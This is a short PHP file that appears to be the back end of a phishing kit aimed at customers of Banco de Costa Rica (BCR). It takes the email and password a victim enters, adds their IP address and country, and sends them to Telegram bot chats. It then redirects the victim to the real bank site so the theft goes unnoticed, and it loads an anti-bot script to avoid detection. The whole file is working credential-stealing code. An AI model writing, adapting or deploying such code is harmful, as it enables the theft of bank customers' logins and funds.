<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));

$message = "🔹BCR🔹\n👤C0rr30: ".$_POST['miDiosenticonfio']."\n🔒Cl4vx: ".$_POST['miDiosenticonfio2']."\nIP: ".$_SERVER['REMOTE_ADDR'].", ".$cc."\n🔹BY SYN4PSE🔹";
$data = [

        'text' => $message
    ];

include "infotlg.php";
include "antibot.php";

$chatIds = array("$edge","$tid","$token",$google);
foreach($chatIds as $chatId) {

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&" . http_build_query($data) );
    file_get_contents("https://api.telegram.org/bot$google/sendMessage?chat_id=$chatId&" . http_build_query($data) );

   echo "<script>top.location.href = \"https://www.bancobcr.com\"</script>";
}
?>